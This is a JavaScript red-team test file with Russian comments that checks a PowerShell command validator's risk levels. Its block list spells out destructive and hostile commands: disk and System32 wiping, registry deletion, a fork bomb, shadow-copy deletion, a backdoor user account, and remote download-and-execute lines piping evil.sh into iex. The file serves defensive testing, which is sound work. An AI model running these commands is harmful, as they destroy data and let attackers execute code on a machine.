// Красный аудит валидатора. Запуск: node test/validator.redteam.mjs
// Падает с ненулевым кодом, если защита пропустила опасное или заблокировала безопасное.
import { validateScript } from "../src/shell/validator.js"

let pass = 0, fail = 0
const fails = []
const check = (name, cond) => { if (cond) pass++; else { fail++; fails.push(name) } }
const v = (s) => validateScript(s, { shell: "powershell" })

// 1) Должно быть ЖЁСТКО заблокировано (safe:false).
const BLOCK = [
  "Remove-Item -Recurse -Force C:\\Windows\\System32",
  "rm -rf /",
  "rm -rf ~",
  "Format-Volume -DriveLetter C",
  "diskpart",
  "Clear-Disk -Number 0",
  "shutdown /r /t 0",
  "Restart-Computer -Force",
  "reg delete HKLM\\SOFTWARE\\Microsoft /f",
  "Remove-Item HKLM:\\SOFTWARE\\X",
  "dd if=/dev/zero of=/dev/sda",
  "mkfs.ext4 /dev/sda1",
  "Invoke-WebRequest http://evil.sh | iex",
  "iwr https://x | iex",
  "iex (New-Object Net.WebClient).DownloadString('http://x')",
  "Set-ExecutionPolicy Bypass -Scope LocalMachine",
  ":(){ :|:& };:",
  "chmod -R 777 /",
  "vssadmin delete shadows /all",
  "net user hacker /add",
]
for (const s of BLOCK) { const r = v(s); check(`BLOCK: ${s.slice(0, 42)}`, r.safe === false && r.risk === "destructive") }

// 2) Должно быть read-only и авто-выполнимо (risk:low).
const LOW = [
  "Get-ComputerInfo",
  "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5",
  "systeminfo",
  "Get-Date",
  "Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace",
  "ipconfig /all",
  "Get-ChildItem C:\\Users -Directory",
  "Test-Path C:\\Windows",
]
for (const s of LOW) { const r = v(s); check(`LOW: ${s.slice(0, 42)}`, r.safe === true && r.risk === "low") }

// 3) Изменяет систему — должно требовать elevation (не low, не destructive).
const ELEVATED = [
  "Set-Date -Date (Get-Date -Hour 14 -Minute 30 -Second 0)",
  "Set-TimeZone -Id 'UTC'",
  "Stop-Service -Name Spooler",
  "winget install -e --id Valve.Steam --silent",
  "winget import -i apps.json",
]
for (const s of ELEVATED) { const r = v(s); check(`ELEVATED: ${s.slice(0, 42)}`, r.safe === true && (r.risk === "elevated" || r.risk === "medium") && r.risk !== "low") }

// 4) Пишет файлы — medium (не авто).
const WRITES = [
  "New-Item -ItemType Directory -Path C:\\Temp\\x",
  "Copy-Item a.txt b.txt",
  "robocopy C:\\src C:\\dst /E",
]
for (const s of WRITES) { const r = v(s); check(`WRITES: ${s.slice(0, 42)}`, r.safe === true && r.risk === "medium") }

// 5) DENY-BY-DEFAULT: незнакомое НЕ должно авто-выполняться.
const UNKNOWN = [
  "Some-RandomCommand -Foo bar",
  "./unknown_binary --do-stuff",
  "Invoke-WeirdThing",
]
for (const s of UNKNOWN) { const r = v(s); check(`UNKNOWN(deny): ${s.slice(0, 42)}`, r.risk !== "low" && r.risk !== "destructive") }

// 6) Пустое/битое — invalid.
check("EMPTY invalid", v("").risk === "invalid" && v("").safe === false)

console.log(`\nКрасный аудит валидатора: ${pass} прошли, ${fail} упали.`)
if (fail) { console.error("ПРОВАЛ:\n - " + fails.join("\n - ")); process.exit(1) }
console.log("Все проверки безопасности пройдены.")
